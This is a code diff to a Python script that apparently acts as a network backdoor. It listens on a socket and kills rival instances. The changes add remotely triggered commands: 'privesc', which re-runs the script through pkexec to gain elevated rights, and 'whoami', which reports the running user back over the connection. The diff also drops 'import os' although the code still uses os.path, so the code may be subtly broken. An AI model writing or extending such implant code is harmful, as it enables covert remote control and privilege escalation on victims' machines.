@@ -11,11 +11,16 @@ import socket
 import subprocess
 import sys
 import time
-import os
 
 
 
 THIS_FILE = os.path.realpath(__file__)
+
+def privesc():
+    subprocess.run(["pkexec", THIS_FILE])
+
+def whoami():
+    return subprocess.run(["whoami"], capture_output=True).stdout.strip()
 
 def run_command(cmd, shell=True, capture_output=True, **kwargs):
     return subprocess.run(
@@ -90,7 +95,15 @@ def handle_conn(conn, addr):
         # For example, you could send a length value before any command, decide on null byte as ending,
         # base64 encode every command, etc
         data = conn.recv(1024) 
-        print("received: " + data.decode("utf-8", errors="replace"))
+        decoded_data = data.decode("utf-8", errors="replace")
+        match decoded_data.strip():
+            case "privesc":
+                privesc()
+            case "whoami":
+                conn.sendall(whoami())
+            case _:
+                print("received: " + decoded_data)
+        
 
         if not data:
             return
@@ -109,7 +122,7 @@ def handle_conn(conn, addr):
 def main():
     kill_others()
     bootstrap_packages()
-
+    print("I am running now")
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -122,8 +135,8 @@ def main():
                 handle_conn(conn, addr)
             except KeyboardInterrupt:
                 raise
-            except:
-                print("Connection died")
+            except Exception as e:
+                print("Connection died", e)
 
 
 if __name__ == "__main__":
